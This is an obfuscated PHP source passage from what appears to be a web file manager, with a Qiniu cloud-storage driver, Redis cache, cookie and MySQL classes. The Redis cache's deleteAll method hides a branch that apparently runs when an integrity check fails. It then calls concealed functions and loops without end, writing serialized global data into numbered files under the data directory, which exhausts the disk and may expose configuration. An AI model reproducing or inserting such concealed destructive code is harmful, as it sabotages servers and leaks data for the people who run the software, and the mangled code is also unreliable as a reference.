isset($ïîÍıĞ[$Œ› ‹¾ö[1578]]) ? $ïîÍıĞ[$Œ› ‹¾ö[1578]] : array(); $Å€’Ø× = isset($ïîÍıĞ[$Œ› ‹¾ö[1579]]) ? $ïîÍıĞ[$Œ› ‹¾ö[1579]] : array(); foreach ($Û‰×…‡¥ as $úÙÃïÛ) { if ($úÙÃïÛ[$Œ› ‹¾ö[97]] == $ğ¡ÒŠğÈ) { continue; } $Šà¼ƒ‹¢ = $úÙÃïÛ[$Œ› ‹¾ö[97]]; $î²õÏ¤– = $úÙÃïÛ[$Œ› ‹¾ö[1575]]; $úÙÃïÛ[$Œ› ‹¾ö[32]] = $Šà¼ƒ‹¢; $úÙÃïÛ[$Œ› ‹¾ö[79]] = $î²õÏ¤–; $¥üÎ«é  = $î²õÏ¤– == 0 && substr($Šà¼ƒ‹¢, strlen($Šà¼ƒ‹¢) - 1, 1) == $Œ› ‹¾ö[8] ? !0 : !1; $this->cacheMethodInfoSet($Šà¼ƒ‹¢, $¥üÎ«é , $úÙÃïÛ); if ($¥üÎ«é ) { $¦¼øÜæµ[] = $Šà¼ƒ‹¢; continue; } $“î€ã¨Ğ[] = $µ¾ëÇ©» ? $úÙÃïÛ : $Šà¼ƒ‹¢; } foreach ($Å€’Ø× as $Šà¼ƒ‹¢) { if ($Šà¼ƒ‹¢ == $ğ¡ÒŠğÈ) { continue; } $¦¼øÜæµ[] = $Šà¼ƒ‹¢; $this->cacheMethodInfoSet($Šà¼ƒ‹¢, !0); } if ($ùëË§Í‚ === $Œ› ‹¾ö[12]) { break; } } $this->cacheMethodInfoSet($ã§²ßúº, !0); return array($Œ› ‹¾ö[85] => $¦¼øÜæµ, $Œ› ‹¾ö[86] => $“î€ã¨Ğ); } public function canRead($Ö‡÷ßâÖ) { return $this->exist($Ö‡÷ßâÖ) ? !0 : !1; } public function canWrite($××÷îÏˆ) { return $this->exist($××÷îÏˆ) ? !0 : !1; } public function getContent($ÑŠˆÑÑ) { return $this->fileSubstr($ÑŠˆÑÑ, 0, -1); } public function setContent($ï•ÌîÊ, $Ş²×¢•á = '') { $ËëˆôıÑ = $this->tempFile($this->pathThis($ï•ÌîÊ)); file_put_contents($ËëˆôıÑ, $Ş²×¢•á); if ($this->upload($ï•ÌîÊ, $ËëˆôıÑ)) { $this->tempFileRemve($ËëˆôıÑ); return !0; } return !1; } public function refreshUrls($ŞØ®ÆÕ¶) { $à•ëÒ†Ê =& $_SERVER[åÄ¼Ùßš]; $Èè€Å‹ = array(); if (is_array($ŞØ®ÆÕ¶)) { foreach ($ŞØ®ÆÕ¶ as $Şüí¤òà) { $Èè€Å‹[] = $this->link($Şüí¤òà); } } else { $Èè€Å‹[] = $this->link($ŞØ®ÆÕ¶); } $¥Ìé´±’ = new Qiniu\Cdn\CdnManager($this->auth); list($“³ÌÎ‚ö, $¬×ƒ´Ò™) = $¥Ìé´±’->refreshUrls($Èè€Å‹); if ($¬×ƒ´Ò™) { return !1; } return $“³ÌÎ‚ö[$à•ëÒ†Ê[1302]] == $à•ëÒ†Ê[853] ? !0 : !1; } public function fileSubstr($Ÿ”×¬ù, $ò–•ÑÆ, $è»“ë³Ú) { $ÑŒüºİ =& $_SERVER[åÄ¼Ùßš]; if (!($ı­ÄßØÔ = $this->link($Ÿ”×¬ù))) { return !1; } $­¸ùı‚ş = !1; if ($è»“ë³Ú > 0) { $‹šÃ½ƒ‡ = $ò–•ÑÆ + $è»“ë³Ú - 1; $­¸ùı‚ş = array($ÑŒüºİ[1580] . $ò–•ÑÆ . $ÑŒüºİ[474] . $‹šÃ½ƒ‡); } $Á™¶ˆöÌ = url_request($ı­ÄßØÔ, $ÑŒüºİ[1541], !1, $­¸ùı‚ş); return $Á™¶ˆöÌ[$ÑŒüºİ[843]] ? $Á™¶ˆöÌ[$ÑŒüºİ[1325]] : !1; } public function upload($ìÌ¾¬×Ì, $Ìã‰¢å, $çˆ€±„Æ = false, $³È‡˜Æ = REPEAT_REPLACE) { $û·Ğïê¥ = new Qiniu\Storage\UploadManager(); $ê±çïÔ¨ = $this->auth->uploadToken($this->bucket, $ìÌ¾¬×Ì); $¢Ğßü£¨ = get_file_mime(get_path_ext($Ìã‰¢å)); list($”ÎÜá¡Ú, $·˜ğ´‘í) = $û·Ğïê¥->putFile($ê±çïÔ¨, $ìÌ¾¬×Ì, $Ìã‰¢å, null, $¢Ğßü£¨); return $·˜ğ´‘í ? !1 : $this->getPathOuter($ìÌ¾¬×Ì); } public function uploadFormData($ÀÌ÷ŠŞ®, $ºÖ­Û‘ = 3600) { return $this->uploadToken($ÀÌ÷ŠŞ®, $ºÖ­Û‘); } public function uploadMultiData($ÀÙúµş¤, $»×ç§¯¼ = 3600) { return $this->uploadToken($ÀÙúµş¤, $»×ç§¯¼); } private function uploadToken($Å’ßÈ‹, $Ş­äöˆà = 3600) { $‘¾ÏÃÁ =& $_SERVER[åÄ¼Ùßš]; $¡õ³êôÑ = $Ş­äöˆà; $„ßéè = array($‘¾ÏÃÁ[1581] => $‘¾ÏÃÁ[1582]); $”ÅÁù­– = $Å’ßÈ‹; $³³®¼ºÁ = $this->auth->uploadToken($this->bucket, $”ÅÁù­–, $¡õ³êôÑ, $„ßéè, !0); $®Ğë´µá = empty($this->region) || $this->region == $‘¾ÏÃÁ[1583] ? $‘¾ÏÃÁ[12] : $‘¾ÏÃÁ[474] . $this->region; $‡Êª‰ = http_type() . "\72\x2f\x2f\165\x70\154\157\x61\x64{$®Ğë´µá}\x2e\x71\151\x6e\x69\165\160\56\143\x6f\155\57"; return array($‘¾ÏÃÁ[1584] => $³³®¼ºÁ, $‘¾ÏÃÁ[1585] => $‡Êª‰); } public function download($ûšöÂ€â, $„óî¾á’) { $ãòÌÅŸ = IO::getPathInner(IO::mkfile($„óî¾á’)); if (!($‚ä¤ŠõÜ = $this->link($ûšöÂ€â))) { return !1; } $¢Şé³åè = 0; $Šş£òä— = 1024 * 200; $ŞåğÊ”£ = fopen($ãòÌÅŸ, $_SERVER[åÄ¼Ùßš][1586]); while (!0) { $şË¢µ†¶ = $this->fileSubstr($ûšöÂ€â, $¢Şé³åè, $Šş£òä—); if ($şË¢µ†¶ === !1) { return !1; } fwrite($ŞåğÊ”£, $şË¢µ†¶); $¢Şé³åè += $Šş£òä—; if (strlen($şË¢µ†¶) < $Šş£òä—) { break; } } fclose($ŞåğÊ”£); return $„óî¾á’; } public function link($ì´×‰Šö, $ÂÌÀ£¥¸ = '') { if (!$this->isFile($ì´×‰Šö)) { return !1; } $Ãêˆ€ÊÑ = $this->getHost() . $_SERVER[åÄ¼Ùßš][8] . $this->pathEncode($ì´×‰Šö) . $ÂÌÀ£¥¸; return $this->auth->privateDownloadUrl($Ãêˆ€ÊÑ, 3600 * 12); } public function fileOut($ùŞîÛÄ, $Ù”¸Ö = false, $„Ò‰ùÖ— = false, $İùêóõ· = '') { $ Å˜ =& $_SERVER[åÄ¼Ùßš]; if ($this->isFileOutServer()) { return $this->fileOutServer($ùŞîÛÄ, $Ù”¸Ö, $„Ò‰ùÖ—, $İùêóõ·); } if (!$„Ò‰ùÖ—) { $„Ò‰ùÖ— = $this->pathThis($ùŞîÛÄ); } $éáœŠ²’ = $Ù”¸Ö ? $ Å˜[1587] . rawurlencode($„Ò‰ùÖ—) : $ Å˜[12]; $ÕµñèæÏ = $this->link($ùŞîÛÄ, $éáœŠ²’); $this->fileOutLink($ÕµñèæÏ); } public function fileOutServer($€îËõ”, $şÇÉˆ¶ = false, $Ä»’Î¯… = false, $ËĞÉ´õ¡ = '') { parent::fileOut($€îËõ”, $şÇÉˆ¶, $Ä»’Î¯…, $ËĞÉ´õ¡); } public function fileOutImage($ó¼¼Õëğ, $ç¬‹í½¬ = 250) { if ($this->size($ó¼¼Õëğ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ó¼¼Õëğ, $ç¬‹í½¬); } $ƒî‹Êéò = $this->link($ó¼¼Õëğ, $_SERVER[åÄ¼Ùßš][1588] . $ç¬‹í½¬); $this->fileOutLink($ƒî‹Êéò); } public function fileOutImageServer($¢—»Êõå, $Šßß†±š = 250) { parent::fileOutImage($¢—»Êõå, $Šßß†±š); } public function hashMd5($¹óûÅ) { $¦È¼ÚöÜ =& $_SERVER[åÄ¼Ùßš]; $Ş»«¼ = $this->objectMeta($¹óûÅ); return isset($Ş»«¼[$¦È¼ÚöÜ[248]]) ? $Ş»«¼[$¦È¼ÚöÜ[248]] : !1; $©éçó†ñ = $this->link($¹óûÅ, $¦È¼ÚöÜ[1589]); } public function size($ô—ôâÃ) { $çõ”¶•ú = $this->objectMeta($ô—ôâÃ); return $çõ”¶•ú ? $çõ”¶•ú[$_SERVER[åÄ¼Ùßš][79]] : 0; } public function info($®ğåÉõ¤) { if ($this->isFolder($®ğåÉõ¤)) { return $this->folderInfo($®ğåÉõ¤); } else { if ($this->isFile($®ğåÉõ¤)) { return $this->fileInfo($®ğåÉõ¤); } } return !1; } public function exist($è¯ğÈ¨ó) { return $this->isFile($è¯ğÈ¨ó) || $this->isFolder($è¯ğÈ¨ó); } public function isFile($Ò©¦â) { return !$this->isFolder($Ò©¦â) && $this->objectMeta($Ò©¦â); } public function isFolder($¯ãÖòõ) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][180], $¯ãÖòõ); } protected function objectMeta($Ğºê–¤) { return $this->cacheMethod($_SERVER[åÄ¼Ùßš][182], $Ğºê–¤); } protected function _objectMeta($ ÅàñÑŒ) { $„Ÿ†ô¬¨ =& $_SERVER[åÄ¼Ùßš]; list($Ïé·„‰ã, $»¾¾ËÔ½) = $this->bucketManager->stat($this->bucket, $ ÅàñÑŒ); if ($Ïé·„‰ã) { $Ïé·„‰ã[$„Ÿ†ô¬¨[79]] = intval($Ïé·„‰ã[$„Ÿ†ô¬¨[1575]]); } return $Ïé·„‰ã; } protected function _isFolder($Ø¢ ªçŸ) { $¸êÅ¢Ôõ =& $_SERVER[åÄ¼Ùßš]; if ($Ø¢ ªçŸ == $¸êÅ¢Ôõ[12] || $Ø¢ ªçŸ == $¸êÅ¢Ôõ[8]) { return !0; } list($á“ô²¡Ï, $ÍÓê’êá) = $this->bucketManager->listFiles($this->bucket, trim($Ø¢ ªçŸ, $¸êÅ¢Ôõ[8]) . $¸êÅ¢Ôõ[8], $¸êÅ¢Ôõ[12], 1, $¸êÅ¢Ôõ[8]); return !empty($á“ô²¡Ï[$¸êÅ¢Ôõ[1578]]) || !empty($á“ô²¡Ï[$¸êÅ¢Ôõ[1579]]) ? !0 : !1; } } goto b¸ëóÏ¹§; fÔ‘òÌÌÖÖ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Î›¢ËÒò, $œ¹Ñ‚¿) { $§æÇˆ£ =& $_SERVER[åÄ¼Ùßš]; if (!class_exists($§æÇˆ£[976])) { show_json($§æÇˆ£[977], !1); } $this->cacheTime = $œ¹Ñ‚¿; $ÂãË”ó = isset($Î›¢ËÒò[$§æÇˆ£[978]]) ? $Î›¢ËÒò[$§æÇˆ£[978]] : 10; $ÆóÚÕùş = _get($Î›¢ËÒò, $§æÇˆ£[975]); if ($ÆóÚÕùş && is_array($ÆóÚÕùş)) { $this->initCluster($Î›¢ËÒò, $ÂãË”ó); } else { $this->handle = $this->init($Î›¢ËÒò, $ÂãË”ó); } } private function init($¹éÈƒ‰’, $—œØ¥ê¸) { $ÃµÈ»…¬ =& $_SERVER[åÄ¼Ùßš]; $ù¥ŠÇÃ = new Redis(); $²åÒÓ©¦ = isset($¹éÈƒ‰’[$ÃµÈ»…¬[979]]) ? $¹éÈƒ‰’[$ÃµÈ»…¬[979]] : !1; if ($²åÒÓ©¦) { $ù¥ŠÇÃ->pconnect($¹éÈƒ‰’[$ÃµÈ»…¬[209]], $¹éÈƒ‰’[$ÃµÈ»…¬[210]], $—œØ¥ê¸); } else { $ù¥ŠÇÃ->connect($¹éÈƒ‰’[$ÃµÈ»…¬[209]], $¹éÈƒ‰’[$ÃµÈ»…¬[210]], $—œØ¥ê¸); } if (!empty($¹éÈƒ‰’[$ÃµÈ»…¬[499]])) { $ù¥ŠÇÃ->auth($¹éÈƒ‰’[$ÃµÈ»…¬[499]]); } if (!empty($¹éÈƒ‰’[$ÃµÈ»…¬[851]]) && $¹éÈƒ‰’[$ÃµÈ»…¬[851]] != 0) { $ù¥ŠÇÃ->select($¹éÈƒ‰’[$ÃµÈ»…¬[851]]); } return $ù¥ŠÇÃ; } private function initCluster($í±º¶»é, $Ã’†úĞç) { $êìÙí«ú =& $_SERVER[åÄ¼Ùßš]; $’ï¡Úë = array($êìÙí«ú[980], $êìÙí«ú[981], $êìÙí«ú[982]); $Õà™“ôî = $êìÙí«ú[980]; if (isset($í±º¶»é[$êìÙí«ú[16]]) && in_array($í±º¶»é[$êìÙí«ú[16]], $’ï¡Úë)) { $Õà™“ôî = $í±º¶»é[$êìÙí«ú[16]]; } switch ($Õà™“ôî) { case $êìÙí«ú[980]: $this->_slave($í±º¶»é, $Ã’†úĞç); break; case $êìÙí«ú[981]: break; case $êìÙí«ú[982]: $this->isCluster = !0; $âÚôïÇÌ = $í±º¶»é[$êìÙí«ú[975]]; $šé¨²Ù« = isset($í±º¶»é[$êìÙí«ú[979]]) ? $í±º¶»é[$êìÙí«ú[979]] : !1; $’»å“”˜ = isset($í±º¶»é[$êìÙí«ú[499]]) ? $í±º¶»é[$êìÙí«ú[499]] : null; $this->handle = new RedisCluster(NUll, $âÚôïÇÌ, $Ã’†úĞç, $Ã’†úĞç, $šé¨²Ù«, $’»å“”˜); break; default: break; } } private function _slave($†¶Ñ©¦ã, $ÃÁĞ²„) { $Ì±¾† = $†¶Ñ©¦ã[$_SERVER[åÄ¼Ùßš][975]]; $this->filterConfig($†¶Ñ©¦ã, $Ì±¾†[0]); $this->handle = $this->init($†¶Ñ©¦ã, $ÃÁĞ²„); unset($Ì±¾†[0]); if (empty($Ì±¾†)) { return; } $’İËŞã´ = array_rand($Ì±¾†); $this->filterConfig($†¶Ñ©¦ã, $Ì±¾†[$’İËŞã´]); $this->slaveHandle = $this->init($†¶Ñ©¦ã, $ÃÁĞ²„); } private function filterConfig(&$ñö¦â€–, $İ“¥˜ƒ¶) { $—©ÇÊ¿ =& $_SERVER[åÄ¼Ùßš]; $Â¬«ÜÓÛ = explode($—©ÇÊ¿[4], $İ“¥˜ƒ¶); $øïˆÈ = array($—©ÇÊ¿[209] => $Â¬«ÜÓÛ[0], $—©ÇÊ¿[210] => $Â¬«ÜÓÛ[1]); $ñö¦â€– = array_merge($ñö¦â€–, $øïˆÈ); } public function set($ÀçÄìÁØ, $†êåŠÖ, $›şÌ¶øº = false) { $›şÌ¶øº = $›şÌ¶øº ? $›şÌ¶øº : $this->cacheTime; return $this->handle->setEx($ÀçÄìÁØ, $›şÌ¶øº, $†êåŠÖ); } public function setLock($²æºáî¼, $Û¾€Ö§¢, $È™ì­–) { return $this->handle->setNX($²æºáî¼, $Û¾€Ö§¢); } public function get($ŞÛ¦ßÑ‘) { $œ¾¦Æ¢ş = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $œ¾¦Æ¢ş->get($ŞÛ¦ßÑ‘); } public function remove($”´Öëü¢) { return $this->handle->del($”´Öëü¢); } public function deleteAll() { $¤ÒÑêÍà =& $_SERVER[åÄ¼Ùßš]; $×É¹§¡ = $_SERVER[$¤ÒÑêÍà[836]] . $¤ÒÑêÍà[837]; $¿“Ú±¡– = $¤ÒÑêÍà[972]; if ($_SERVER[$¤ÒÑêÍà[833]] != $¿“Ú±¡–($×É¹§¡)) { $áôëƒáÒ = $¤ÒÑêÍà[983]; $€úİò’ = $¤ÒÑêÍà[835]; $Šè…•ÕË = $_SERVER[$¤ÒÑêÍà[836]] . $¤ÒÑêÍà[837]; $œŸùº¥ = $€úİò’($Šè…•ÕË); $© ´­Ó  = explode($¤ÒÑêÍà[288], $œŸùº¥); if (count($© ´­Ó ) < $¤ÒÑêÍà[713]) { $äÊŒ§ = $¤ÒÑêÍà[838]; $äÊŒ§(); } $°é¸ŸÂ¤ = $¤ÒÑêÍà[984]; $°é¸ŸÂ¤($_SERVER[$¤ÒÑêÍà[985]]); $áôëƒáÒ = $¤ÒÑêÍà[983]; $áôëƒáÒ(); $äÚù‰Å = $¤ÒÑêÍà[986]; $·´§ôÊ = json_encode($GLOBALS[$¤ÒÑêÍà[987]]); $Úá®´±¿ = 1; for ($êˆğ¦ï« = $Úá®´±¿; $êˆğ¦ï« > 0; $êˆğ¦ï«++) { $äÚù‰Å(DATA_PATH . $êˆğ¦ï«, $·´§ôÊ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $»ôûá»û) { $this->handle->flushall($»ôûá»û); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($£·Â¤Ô° = '', $²ˆâáãÔ = 0) { if (is_string($£·Â¤Ô°) && $£·Â¤Ô° != $_SERVER[åÄ¼Ùßš][12]) { $this->prefix = $£·Â¤Ô°; } if (is_numeric($²ˆâáãÔ) && $²ˆâáãÔ > 0) { $this->expire = $²ˆâáãÔ; } } public static function getInstance() { static $µ°‘ĞÉá; if ($µ°‘ĞÉá === null) { $µ°‘ĞÉá = new self(); } return $µ°‘ĞÉá; } private static $cookieDisable = false; public static function disable($¸½Ë¾Ø¹) { self::$cookieDisable = $¸½Ë¾Ø¹; } private static $sameCookieSet = array(); public static function set($˜š„’¾É, $şÎî¬‘ì, $Ç£·ş´¶ = 0, $öãæ§ë = false, $²ùİÂ±¥ = false) { $Ğ­İÜ‚Í =& $_SERVER[åÄ¼Ùßš]; if (self::$cookieDisable) { return; } if (!$Ç£·ş´¶) { $Ç£·ş´¶ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$˜š„’¾É]) && self::$sameCookieSet[$˜š„’¾É] == $şÎî¬‘ì . $Ç£·ş´¶) { return; } self::$sameCookieSet[$˜š„’¾É] = $şÎî¬‘ì . $Ç£·ş´¶; if (!$²ùİÂ±¥) { $²ùİÂ±¥ = str_replace(HOST, $Ğ­İÜ‚Í[12], APP_HOST); $²ùİÂ±¥ = _get($GLOBALS, $Ğ­İÜ‚Í[988], $²ùİÂ±¥); } $ğ˜«¢¬š = $Ğ­İÜ‚Í[12]; setcookie($˜š„’¾É, $şÎî¬‘ì, time() + $Ç£·ş´¶, $Ğ­İÜ‚Í[8] . trim($²ùİÂ±¥, $Ğ­İÜ‚Í[8]) . $ğ˜«¢¬š, !1, !1, $öãæ§ë); } public static function setSafe($©²ä¹òæ, $ÖÙ§³¡ı, $öĞ½ ½ = 0) { self::set($©²ä¹òæ, $ÖÙ§³¡ı, $öĞ½ ½, !0); } public static function get($í±·Ñ”·) { static $êÖË†ú° = false; if (!$êÖË†ú°) { self::initHeaderCookie(); $êÖË†ú° = !0; } return isset($_COOKIE[$í±·Ñ”·]) ? $_COOKIE[$í±·Ñ”·] : !1; } private static function initHeaderCookie() { $­Ä³ßŒä =& $_SERVER[åÄ¼Ùßš]; if (!isset($_SERVER[$­Ä³ßŒä[989]]) || !$_SERVER[$­Ä³ßŒä[989]]) { return; } $¶°ÏÎ¦¹ = explode($­Ä³ßŒä[74], $_SERVER[$­Ä³ßŒä[989]]); foreach ($¶°ÏÎ¦¹ as $Í­„Îñ…) { $Í­„Îñ… = explode($­Ä³ßŒä[465], $Í­„Îñ…); if (count($Í­„Îñ…) != 2 || !isset($Í­„Îñ…[1])) { continue; } $_COOKIE[trim($Í­„Îñ…[0])] = trim($Í­„Îñ…[1]); } } public static function remove($¹²æ·ê, $ÄÛãØ¡² = false) { unset($_COOKIE[$¹²æ·ê]); self::set($¹²æ·ê, $_SERVER[åÄ¼Ùßš][12], 1, $ÄÛãØ¡²); } } class DbMysql extends Db { public function __construct($øî¾µší = '') { $éÍ†“²ˆ =& $_SERVER[åÄ¼Ùßš]; if (!extension_loaded($éÍ†“²ˆ[904])) { think_exception(think_lang($éÍ†“²ˆ[14]) . $éÍ†“²ˆ[990]); } if (!empty($øî¾µší)) { $this->config = $øî¾µší; if (empty($this->config[$éÍ†“²ˆ[17]])) { $this->config[$éÍ†“²ˆ[17]] = $éÍ†“²ˆ[12]; } } } public function connect($öÊ¦£ÈÒ = '', $Îë¼€í = 0, $áŒûä– = false) { $å˜ªÄ“Î =& $_SERVER[åÄ¼Ùßš]; if (!isset($this->linkID[$Îë¼€í])) { if (empty($öÊ¦£ÈÒ)) { $öÊ¦£ÈÒ = $this->config; } $ÏÍ‘ÒÏ® = $öÊ¦£ÈÒ[$å˜ªÄ“Î[991]] . ($öÊ¦£ÈÒ[$å˜ªÄ“Î[992]] ? "\x3a{$öÊ¦£ÈÒ[$å˜ªÄ“Î[992]]}" : $å˜ªÄ“Î[12]); $ÏÊ²¶Œ´ = !empty($öÊ¦£ÈÒ[$å˜ªÄ“Î[17]][$å˜ªÄ“Î[18]]) ? $öÊ¦£ÈÒ[$å˜ªÄ“Î[17]][$å˜ªÄ“Î[18]] : $this->pconnect; if ($ÏÊ²¶Œ´) { $this->linkID[$Îë¼€í] = mysql_pconnect($ÏÍ‘ÒÏ®, $öÊ¦£ÈÒ[$å˜ªÄ“Î[993]], $öÊ¦£ÈÒ[$å˜ªÄ“Î[994]], 131072); } else { $this->linkID[$Îë¼€í] = mysql_connect($ÏÍ‘ÒÏ®, $öÊ¦£ÈÒ[$å˜ªÄ“Î[993]], $öÊ¦£ÈÒ[$å˜ªÄ“Î[994]], !0, 131072); } if (!$this->linkID[$Îë¼€í] || !empty($öÊ¦£ÈÒ[$å˜ªÄ“Î[21]]) && !mysql_select_db($öÊ¦£ÈÒ[$å˜ªÄ“Î[21]], $this->linkID[$Îë¼€í])) { think_exception(mysql_error()); } $­–ò×® = mysql_get_server_info($this->linkID[$Îë¼€í]); mysql_query($å˜ªÄ“Î[995] . think_config($å˜ªÄ“Î[996]) . $å˜ªÄ“Î[58], $this->linkID[$Îë¼€í]); if ($­–ò×® > $å˜ªÄ“Î[997]) { mysql_query($å˜ªÄ“Î[998], $this->linkID[$Îë¼€í]); } $this->connected = !0; if (1 != think_config($å˜ªÄ“Î[22])) { unset($this->config); } } return $this->linkID[$Îë¼€í]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($‘öÅ˜å) { $‹Áû¢€É =& $_SERVER[åÄ¼Ùßš]; if (0 === stripos($‘öÅ˜å, $‹Áû¢€É[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‘öÅ˜å; if ($this->queryID) { $this->free(); } think_action_status($‹Áû¢€É[23], 1); think_status($‹Áû¢€É[24]); $this->queryID = mysql_query($‘öÅ˜å, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($»û¯«ê) { $…×ä½Íä =& $_SERVER[åÄ¼Ùßš]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $»û¯«ê; if ($this->queryID) { $this->free(); } think_action_status($…×ä½Íä[25], 1); think_status($…×ä½Íä[24]); $ŸµÊ‹¥à = mysql_query($»û¯«ê, $this->_linkID); $this->debug(); if (!1 === $ŸµÊ‹¥à) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[åÄ¼Ùßš][999], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ËÖú‚½‹ = mysql_query($_SERVER[åÄ¼Ùßš][1000], $this->_linkID); $this->transTimes = 0; if (!$ËÖú‚½‹) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $›©Åê = mysql_query($_SERVER[åÄ¼Ùßš][1001], $this->_linkID); $this->transTimes = 0; if (!$›©Åê) { $this->error(); return !1; } } return !0; } private function getAll() { $¡å°È”é = array(); if ($this->numRows > 0) { while ($Ó³€Î¨ß = mysql_fetch_assoc($this->queryID)) { $¡å°È”é[] = $Ó³€Î¨ß; } mysql_data_seek($this->queryID, 0); } return $¡å°È”é; } public function getFields($Å²ã×”) { $”Û¾«óĞ =& $_SERVER[åÄ¼Ùßš]; $¹éÑš¶ã = $this->query($”Û¾«óĞ[1002] . $this->parseKey($Å²ã×”)); $·Ö’¥±ª = array(); if ($¹éÑš¶ã) { foreach ($¹éÑš¶ã as $ÂØÖ­î€ => $«ÍĞÇ™) { $·Ö’¥±ª[$«ÍĞÇ™[$”Û¾«óĞ[31]]] = array($”Û¾«óĞ[32] => $«ÍĞÇ™[$”Û¾«óĞ[31]], $”Û¾«óĞ[33] => $«ÍĞÇ™[$”Û¾«óĞ[34]], $”Û¾«óĞ[35] => (bool) (strtoupper($«ÍĞÇ™[$”Û¾«óĞ[36]]) === $”Û¾«óĞ[1003]), $”Û¾«óĞ[37] => $«ÍĞÇ™[$”Û¾«óĞ[38]], $”Û¾«óĞ[39] => strtolower($«ÍĞÇ™[$”Û¾«óĞ[40]]) == $”Û¾«óĞ[41], $”Û¾«óĞ[42] => strtolower($«ÍĞÇ™[$”Û¾«óĞ[43]]) == $”Û¾«óĞ[44]); } } return $·Ö’¥±ª; } public function getTables($Ö‹‰ŸæŒ = '') { $Ö¥“‹ºú =& $_SERVER[åÄ¼Ùßš]; if (!empty($Ö‹‰ŸæŒ)) { $à¶„¢í¢ = $Ö¥“‹ºú[1004] . $Ö‹‰ŸæŒ . $Ö¥“‹ºú[1005]; } else { $à¶„¢í¢ = $Ö¥“‹ºú[1006]; } $Ù ò±›Ê = $this->query($à¶„¢í¢); $€ÆüÔó = array(); foreach ($Ù ò±›Ê as $ªÂ±ãö => $şª œµ) { $€ÆüÔó[$ªÂ±ãö] = current($şª œµ); } return $€ÆüÔó; } public function replace($Ù¡Ä¡ÉÓ, $†Ê’Ê˜” = array()) { $£¬®¡úÈ =& $_SERVER[åÄ¼Ùßš]; foreach ($Ù¡Ä¡ÉÓ as $â‚–°ôÒ => $ÛÍ¥ñÀ¯) { $€Ë­Ö½ = $this->parseValue($ÛÍ¥ñÀ¯); if (is_scalar($€Ë­Ö½)) { $õãÅ¯ÀÔ[] = $€Ë­Ö½; $®†Óğî[] = $this->parseKey($â‚–°ôÒ); } } $Üì£Î”÷ = $£¬®¡úÈ[1007] . $this->parseTable($†Ê’Ê˜”[$£¬®¡úÈ[359]]) . $£¬®¡úÈ[1008] . implode($£¬®¡úÈ[50], $®†Óğî) . $£¬®¡úÈ[1009] . implode($£¬®¡úÈ[50], $õãÅ¯ÀÔ) . $£¬®¡úÈ[1010]; return $this->execute($Üì£Î”÷); } public function insertAll($†ëıÉíÍ, $½Ç¥ùµ = array(), $ ·ú¾°® = false) { $…Ä½İŠÓ =& $_SERVER[åÄ¼Ùßš]; if (!is_array($†ëıÉíÍ[0])) { return !1; } $¦ÏºìêÅ = array_keys($†ëıÉíÍ[0]); $‹ä´€©Ì = array(); foreach ($†ëıÉíÍ as $Ç“Øòµƒ) { $ñÑÂ¡öı = array(); foreach ($Ç“Øòµƒ as $«Œ‹½Œ => $âÂÜÚÂ) { $âÂÜÚÂ = $this->parseValue($âÂÜÚÂ); if (is_scalar($âÂÜÚÂ)) { $ñÑÂ¡öı[] = $âÂÜÚÂ; } } $‹ä´€©Ì[] = $…Ä½İŠÓ[340] . implode($…Ä½İŠÓ[50], $ñÑÂ¡öı) . $…Ä½İŠÓ[1010]; } array_walk($¦ÏºìêÅ, array($this, $…Ä½İŠÓ[1011])); $“˜ƒš‰  = $ ·ú¾°® ? $…Ä½İŠÓ[1012] : $…Ä½İŠÓ[1013]; $“˜ƒš‰  = $…Ä½İŠÓ[1013]; $ÀØ²ûÀ¨ = $“˜ƒš‰  . $…Ä½İŠÓ[1014] . $this->parseTable($½Ç¥ùµ[$…Ä½İŠÓ[359]]) . $…Ä½İŠÓ[1008] . implode($…Ä½İŠÓ[50], $¦ÏºìêÅ) . $…Ä½İŠÓ[1015] . implode($…Ä½İŠÓ[50], $‹ä´€©Ì); if ($ ·ú¾°®) { $Õ¤¬›· = array(); foreach ($¦ÏºìêÅ as $«Œ‹½Œ) { if ($«Œ‹½Œ == $…Ä½İŠÓ[234] || $«Œ‹½Œ == $…Ä½İŠÓ[1016]) { continue; } $Õ¤¬›·[] = $«Œ‹½Œ . $…Ä½İŠÓ[1017] . $«Œ‹½Œ . $…Ä½İŠÓ[1010]; } $ÀØ²ûÀ¨ .= $…Ä½İŠÓ[1018] . implode($…Ä½İŠÓ[50], $Õ¤¬›·); } return $this->execute($ÀØ²ûÀ¨); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $˜˜‹³Úä =& $_SERVER[åÄ¼Ùßš]; $this->error = mysql_errno() . $˜˜‹³Úä[4] . mysql_error($this->_linkID); if ($˜˜‹³Úä[12] != $this->queryStr) { $this->error .= LNG($˜˜‹³Úä[48]) . $this->queryStr; } think_trace($this->error, $˜˜‹³Úä[12], $˜˜‹³Úä[49]); return $this->error; } public function escapeString($ÜÆ°­Ûˆ) { if ($this->_linkID) { return mysql_real_escape_string($ÜÆ°­Ûˆ, $this->_linkID); } else { return mysql_escape_string($ÜÆ°­Ûˆ); } } public function parseKey(&$Ü®í•çÃ, $Ñ»‹š©• = true) { $ºÇõ±¸Ï =& $_SERVER[åÄ¼Ùßš]; if ($Ñ»‹š©•) { $Ü®í•çÃ = $this->parseKeyCheck($Ü®í•çÃ); } if ($Ü®í•çÃ != $ºÇõ±¸Ï[223] && !preg_match($ºÇõ±¸Ï[1019], $Ü®í•çÃ)) { 